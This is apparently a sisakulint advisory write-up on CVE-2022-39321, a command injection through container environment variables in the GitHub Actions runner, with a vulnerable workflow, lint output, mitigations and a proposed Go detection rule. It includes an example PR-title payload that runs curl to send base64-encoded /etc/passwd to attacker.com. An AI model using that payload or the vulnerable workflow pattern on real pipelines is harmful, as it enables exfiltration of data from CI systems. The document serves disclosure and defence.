# GHSA-2c6m-6gqh-6qg3

## Summary
| Field | Value |
|-------|-------|
| CVE | CVE-2022-39321 |
| Affected Action | actions/runner |
| Severity | High (CVSS 8.8) |
| Vulnerability Type | OS Command Injection via Docker Environment Variable Escaping (CWE-78) |
| Published | October 24, 2022 |

## Vulnerability Description

The GitHub Actions runner contains a command injection vulnerability in how it encodes environment variables when invoking Docker CLI commands. According to the advisory: "A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly."

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L)
- User Interaction: None (UI:N)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: High (A:H)

**Affected Versions:**
- >= 2.294.0, < 2.296.1
- >= 2.290.0, < 2.293.1
- >= 2.286.0, < 2.289.4
- >= 2.284.0, < 2.285.2
- < 2.283.4

**Patched Versions:**
- 2.296.2
- 2.293.1
- 2.289.4
- 2.285.2
- 2.283.4

The flaw affects workflows that combine container actions, job containers, or service containers "alongside untrusted user inputs in environment variables." Attackers could escape the environment variable context and inject additional Docker command parameters.

The runner internally constructs docker commands that include environment variables, and insufficient escaping allows shell command substitution to occur. For example:

```bash
# Runner constructs something like:
docker run -e "USER_INPUT=$(malicious command)" image:tag
```

This is particularly dangerous in `pull_request_target` workflows where untrusted PR data (title, body, branch names) can be controlled by attackers.

## Vulnerable Pattern

```yaml
jobs:
  vulnerable:
    runs-on: ubuntu-latest
    container:
      image: node:18
      env:
        # Untrusted input in container environment
        USER_INPUT: ${{ github.event.pull_request.title }}

    steps:
      - name: Process user input in container
        run: echo "Processing: $USER_INPUT"
```

An attacker could create a PR with title: `Test PR $(curl attacker.com/exfil?data=$(cat /etc/passwd | base64))`

The command injection would execute during container startup, before any workflow steps run.

## Detection in sisakulint

### Detection Result

```
script/actions/advisory/GHSA-2c6m-6gqh-6qg3-vulnerable.yaml:9:3: dangerous trigger (critical): workflow uses privileged trigger(s) [pull_request_target] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
script/actions/advisory/GHSA-2c6m-6gqh-6qg3-vulnerable.yaml:17:14: container image 'node:18' in container of job 'vulnerable' is using a tag without SHA256 digest. Tags are mutable and can be overwritten. Consider pinning with SHA256 digest (e.g., node:18@sha256:...). [unpinned-images]
```

### Analysis

| Expected | Detected | Rule |
|----------|----------|------|
| Container environment variable injection | Partial | dangerous-triggers-critical, unpinned-images |

sisakulint **partially detected** this vulnerability:

**Detected Items:**
- **dangerous-triggers-critical**: Detected that the `pull_request_target` trigger is used without appropriate security mitigations
- **unpinned-images**: Detected that container images are not pinned with SHA256 digests

**Items Not Detected:**
- Container-specific environment variable injection (the `container.env` field)
- The specific docker command escaping issue
- The distinction between step-level `env` (safer) and job-level `container.env` (vulnerable)

**Reason for Partial Detection:**

Current detection focuses on step `run` commands and step-level `env`. This vulnerability specifically affects job-level `container.env`, which is a different configuration scope. Extending detection to cover `container.env` would improve coverage.

**Detection Category**: Partially detectable (the environment variable injection category matches, but container-specific patterns are not covered)

## Mitigation

**Primary Solution: Update to Patched Runner Versions**

The patches have been deployed to GitHub.com. For self-hosted runners, GHES, and GHAE:

1. **GitHub-hosted runners:** Already patched automatically
2. **GitHub Enterprise Server (GHES):** Hotfixes available for administrators
3. **GitHub AE (GHAE):** Hotfixes available for administrators
4. **Self-hosted runners:** Update to one of the patched versions:
   - 2.296.2
   - 2.293.1
   - 2.289.4
   - 2.285.2
   - 2.283.4

**Workaround (Until Patched):**

The advisory recommends: "You may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions."

**Additional Mitigations:**

1. **Avoid container env with untrusted input**: Don't pass untrusted input directly to `container.env`
   ```yaml
   # Bad
   container:
     env:
       USER_DATA: ${{ github.event.pull_request.title }}

   # Good - use step-level env instead
   steps:
     - env:
         USER_DATA: ${{ github.event.pull_request.title }}
       run: echo "$USER_DATA"
   ```

2. **Sanitize input**: If you must use container env, sanitize the input first:
   ```yaml
   steps:
     - id: sanitize
       run: echo "safe_title=$(echo '${{ github.event.pull_request.title }}' | tr -d '\n' | sed 's/[^a-zA-Z0-9 ]//g')" >> $GITHUB_OUTPUT

   - uses: docker://myimage
     env:
       TITLE: ${{ steps.sanitize.outputs.safe_title }}
   ```

3. **Use GitHub-hosted runners**: The impact is more severe on self-hosted runners where container breakout could affect the host system

## Possible Rule Enhancement

sisakulint could improve detection by:

1. Adding specific checks for `container.env` field in job definitions
2. Flagging any untrusted input in `container.env` in privileged contexts
3. Suggesting step-level `env` as a safer alternative

Example enhancement:
```go
// In ContainerEnvInjectionRule.VisitJobPre()
if job.Container != nil && job.Container.Env != nil {
    for key, value := range job.Container.Env {
        if containsUntrustedInput(value) {
            rule.Errorf(job.Pos,
                "untrusted input in container.env may lead to command injection. " +
                "Use step-level env instead")
        }
    }
}
```

## Technical Fix Details

**Patched Versions Fixed the Docker Command Encoding Bug**

The fix addresses the environment variable escaping flaw in the Docker CLI invocation logic. The patches ensure that environment variables passed to container jobs are properly escaped to prevent command injection.

**Pull Requests:**
- [actions/runner#2107](https://github.com/actions/runner/pull/2107)
- [actions/runner#2108](https://github.com/actions/runner/pull/2108)

The specific implementation details of the fix ensure that special characters in environment variables (such as `$`, backticks, and command substitution syntax) are properly escaped before being passed to Docker commands.

## References
- [GitHub Advisory: GHSA-2c6m-6gqh-6qg3](https://github.com/advisories/GHSA-2c6m-6gqh-6qg3)
- [actions/runner Security Advisory](https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3)
- [Pull Request #2107](https://github.com/actions/runner/pull/2107)
- [Pull Request #2108](https://github.com/actions/runner/pull/2108)
- [actions/runner Repository](https://github.com/actions/runner)
- [NVD: CVE-2022-39321](https://nvd.nist.gov/vuln/detail/CVE-2022-39321)
- [sisakulint: EnvVarInjectionCriticalRule](../../docs/envvarinjection.md)
